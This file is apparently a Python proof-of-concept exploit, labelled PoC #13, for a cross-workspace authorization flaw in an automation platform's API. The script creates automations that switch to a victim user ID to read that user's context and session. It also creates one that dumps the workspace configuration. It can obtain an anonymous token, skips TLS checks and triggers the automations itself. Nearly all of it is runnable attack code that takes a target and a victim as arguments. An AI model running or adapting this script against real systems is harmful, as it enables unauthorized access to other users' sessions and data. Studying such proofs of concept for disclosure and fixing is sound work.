#!/usr/bin/env python3
"""
PoC #13 — Cross-Workspace Context Fetch via set user.id
HIGH: set instruction allows switching to arbitrary user IDs.
switchUser fetches contexts without workspace-scoping check.

Usage: python3 poc_13_cross_workspace_context.py --target https://dev.example.com --workspace-id WS_ID --token AUTH_TOKEN --victim-user-id VICTIM_ID
"""

import argparse
import requests
import json
import urllib3
urllib3.disable_warnings()


def create_context_steal_automation(base_url, workspace_id, token, victim_user_id):
    """Create automation that switches to victim user and reads their context."""
    print(f"\n[*] Creating automation to steal context of user: {victim_user_id}...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/automations"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    automation = {
        "slug": "poc-context-steal",
        "name": "PoC Cross-Workspace Context",
        "trigger": {"events": ["poc.context.steal"]},
        "instructions": [
            # Save original context
            {
                "set": {
                    "name": "original_user",
                    "value": "{{user}}"
                }
            },
            # Switch to victim user
            {
                "set": {
                    "name": "user.id",
                    "value": victim_user_id
                }
            },
            # Read victim's context
            {
                "set": {
                    "name": "stolen_context",
                    "value": {
                        "user": "{{user}}",
                        "session": "{{session}}",
                    }
                }
            },
            # Also read $workspace for bonus info disclosure
            {
                "set": {
                    "name": "workspace_dsul",
                    "value": "{{$workspace}}"
                }
            },
            # Emit results
            {
                "emit": {
                    "event": "poc.context.result",
                    "payload": {
                        "original_user": "{{original_user}}",
                        "victim_user_context": "{{stolen_context}}",
                        "workspace_dsul_keys": "{% Object.keys($workspace || {}) %}",
                    }
                }
            }
        ]
    }

    try:
        r = requests.post(url, headers=headers, json=automation, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code in (200, 201):
            print(f"  [HIGH] Context-stealing automation created!")
            print(f"  [INFO] Trigger event 'poc.context.steal' to execute")
            return True
        else:
            print(f"  Response: {r.text[:500]}")
    except Exception as e:
        print(f"  [ERROR] {e}")
    return False


def create_dsul_exfil_automation(base_url, workspace_id, token):
    """Create automation that exfiltrates the full $workspace DSUL."""
    print(f"\n[*] Creating automation to exfiltrate $workspace DSUL...")

    url = f"{base_url}/v2/workspaces/{workspace_id}/automations"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }

    automation = {
        "slug": "poc-dsul-exfil",
        "name": "PoC DSUL Exfiltration",
        "trigger": {"events": ["poc.dsul.exfil"]},
        "instructions": [
            {
                "emit": {
                    "event": "poc.dsul.result",
                    "payload": {
                        "workspace_name": "{{$workspace.name}}",
                        "automations": "{% json($workspace.automations || {}) %}",
                        "imports": "{% json($workspace.imports || {}) %}",
                        "config": "{% json($workspace.config || {}) %}",
                        "customDomains": "{% json($workspace.customDomains || {}) %}",
                    }
                }
            }
        ]
    }

    try:
        r = requests.post(url, headers=headers, json=automation, verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        if r.status_code in (200, 201):
            print(f"  [HIGH] DSUL exfiltration automation created!")
            print(f"  [INFO] Trigger event 'poc.dsul.exfil' to execute")
            return True
        else:
            print(f"  Response: {r.text[:500]}")
    except Exception as e:
        print(f"  [ERROR] {e}")
    return False


def trigger_event(base_url, workspace_id, token, event_type):
    """Trigger an automation event."""
    print(f"\n[*] Triggering event: {event_type}...")
    url = f"{base_url}/v2/workspaces/{workspace_id}/events"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    try:
        r = requests.post(url, headers=headers, json={"type": event_type, "payload": {}},
                          verify=False, timeout=15)
        print(f"  Status: {r.status_code}")
        return r.status_code in (200, 201, 202)
    except Exception as e:
        print(f"  [ERROR] {e}")
        return False


def main():
    parser = argparse.ArgumentParser(description="PoC #13: Cross-Workspace Context Steal")
    parser.add_argument("--target", required=True, help="Base URL")
    parser.add_argument("--workspace-id", required=True, help="Workspace ID")
    parser.add_argument("--token", default="", help="Bearer token (optional with auto-auth)")
    parser.add_argument("--victim-user-id", default="admin", help="Victim user ID")
    parser.add_argument("--trigger", action="store_true", help="Also trigger the automations")
    args = parser.parse_args()

    if not args.token:
        from auth_helper import get_anonymous_token
        print("[*] No token provided — obtaining anonymous auth token...")
        token, user_id, _ = get_anonymous_token(args.target)
        if token:
            args.token = token
            print(f"[+] Anonymous token obtained! User ID: {user_id}")
        else:
            print("[-] Failed to get anonymous token. Provide --token manually.")
            return


    base = args.target.rstrip("/")
    print(f"[*] Target: {base}")
    print("=" * 60)

    results = {}
    results["context_steal"] = create_context_steal_automation(
        base, args.workspace_id, args.token, args.victim_user_id
    )
    results["dsul_exfil"] = create_dsul_exfil_automation(
        base, args.workspace_id, args.token
    )

    if args.trigger:
        trigger_event(base, args.workspace_id, args.token, "poc.context.steal")
        trigger_event(base, args.workspace_id, args.token, "poc.dsul.exfil")

    print("\n" + "=" * 60)
    print("[*] SUMMARY")
    for k, v in results.items():
        print(f"  {k}: {'AUTOMATION CREATED' if v else 'FAILED'}")
    print("\n[*] Check event logs for poc.context.result and poc.dsul.result")


if __name__ == "__main__":
    main()
